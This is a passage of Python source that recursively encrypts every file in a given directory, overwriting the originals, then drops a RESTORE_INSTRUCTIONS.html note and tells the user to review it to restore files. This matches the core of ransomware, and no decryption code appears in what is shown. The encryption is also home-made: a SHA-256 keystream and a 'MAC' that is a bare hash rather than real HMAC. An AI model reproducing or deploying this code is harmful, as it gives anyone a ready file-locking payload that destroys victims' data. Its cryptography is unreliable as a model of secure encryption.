def derive_key(passphrase: bytes, salt: bytes, iterations: int = 100_000) -> bytes:
    return hashlib.pbkdf2_hmac('sha256', passphrase, salt, iterations, dklen=32)


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def encrypt_file(filepath: Path, passphrase: bytes) -> None:
    salt  = secrets.token_bytes(16)
    nonce = secrets.token_bytes(16)
    key   = derive_key(passphrase, salt)

    with open(filepath, 'rb') as f:
        plaintext = f.read()

    ciphertext = bytearray()
    block_size = 32

    for counter, offset in enumerate(range(0, len(plaintext), block_size)):
        counter_bytes  = counter.to_bytes(16, 'big')
        keystream_block = hashlib.sha256(key + nonce + counter_bytes).digest()
        chunk = plaintext[offset:offset + block_size]
        ciphertext.extend(xor_bytes(chunk, keystream_block))

    hmac_key = derive_key(passphrase, salt + b'hmac')
    mac = hashlib.sha256(hmac_key + salt + nonce + bytes(ciphertext)).digest()

    with open(filepath, 'wb') as f:
        f.write(salt)
        f.write(nonce)
        f.write(mac)
        f.write(ciphertext)


def write_restore_instructions(directory: Path) -> Path:
    dest = directory / 'RESTORE_INSTRUCTIONS.html'
    with open(dest, 'w', encoding='utf-8') as f:
        f.write(RESTORE_INSTRUCTIONS_HTML)
    return dest


def encrypt_directory(directory: str, passphrase: str) -> None:
    dir_path = Path(directory).resolve()

    if not dir_path.exists():
        print(f"Error: '{directory}' does not exist.", file=sys.stderr)
        sys.exit(1)
    if not dir_path.is_dir():
        print(f"Error: '{directory}' is not a directory.", file=sys.stderr)
        sys.exit(1)

    passphrase_bytes = passphrase.encode('utf-8')
    instructions_path = dir_path / 'RESTORE_INSTRUCTIONS.html'

    encrypted = 0
    failed    = 0

    for root, _, files in os.walk(directory):
        for filename in files:
            filepath = Path(root) / filename

            # skip the instructions file if it already exists
            if filepath.resolve() == instructions_path.resolve():
                continue

            # unique per-file passphrase derived from the global passphrase + path
            file_context    = str(filepath.resolve()).encode('utf-8')
            file_passphrase = hashlib.sha256(passphrase_bytes + file_context).digest()

            try:
                encrypt_file(filepath, file_passphrase)
                print(f"  encrypted: {filepath}")
                encrypted += 1
            except Exception as exc:
                print(f"  failed:    {filepath} — {exc}", file=sys.stderr)
                failed += 1

    restore_path = write_restore_instructions(dir_path)

    print()
    print("=" * 60)
    print(f"  Encryption complete.")
    print(f"  Files encrypted : {encrypted}")
    if failed:
        print(f"  Files failed    : {failed}")
    print()
    print(f"  All files in '{dir_path}' have been encrypted.")
    print(f"  To restore your files, please review:")
    print(f"  {restore_path}")
    print("=" * 60)


def main() -> None:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <directory> [passphrase]", file=sys.stderr)
        sys.exit(1)

    directory = sys.argv[1]

    if len(sys.argv) >= 3:
        passphrase = sys.argv[2]
    else:
        import getpass
        passphrase = getpass.getpass("Enter passphrase: ")

    if not passphrase:
        print("Error: passphrase cannot be empty.", file=sys.stderr)
        sys.exit(1)

    encrypt_directory(directory, passphrase)


if __name__ == '__main__':
    main()

